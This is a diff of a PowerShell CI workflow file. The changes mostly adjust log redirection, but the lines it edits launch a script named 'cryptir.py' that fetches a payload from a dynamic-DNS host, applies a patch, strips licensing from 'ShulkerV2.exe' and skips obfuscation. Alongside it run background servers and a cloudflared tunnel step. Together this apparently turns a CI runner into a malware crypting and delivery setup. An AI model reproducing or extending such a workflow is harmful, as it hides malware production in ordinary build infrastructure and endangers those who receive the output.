@@ -230,9 +230,11 @@ jobs:
           # pyw -3.11 server.py 
           # pyw -3.11 cloud.py
           $logFile = "C:\Users\runneradmin\FLAG\log.txt"
-          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cryptir.py', '--interval', '3600', '--sleep', '100', '--payload-url', 'http://heteronomous.kozow.com/files/sv2.dat', '--output', '.', '--input', 'out.exe', '--skip-obfuscation', '--unlicense-target', 'ShulkerV2.exe', '--patch-script', 'patch.py' -RedirectStandardOutput $logFile -RedirectStandardError $logFile
-          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'server.py' -RedirectStandardOutput $logFile -RedirectStandardError $logFile
-          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cloud.py' -RedirectStandardOutput $logFile -RedirectStandardError $logFile
+          $logFile1 = "C:\Users\runneradmin\FLAG\log1.txt"
+          $logFile2 = "C:\Users\runneradmin\FLAG\log2.txt"
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cryptir.py', '--interval', '3600', '--sleep', '100', '--payload-url', 'http://heteronomous.kozow.com/files/sv2.dat', '--output', '.', '--input', 'out.exe', '--skip-obfuscation', '--unlicense-target', 'ShulkerV2.exe', '--patch-script', 'patch.py' -RedirectStandardOutput $logFile 
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'server.py' -RedirectStandardOutput $logFile1 
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cloud.py' -RedirectStandardOutput $logFile2 
           
       - name: Run Node server and cloudflared with timer
         shell: powershell
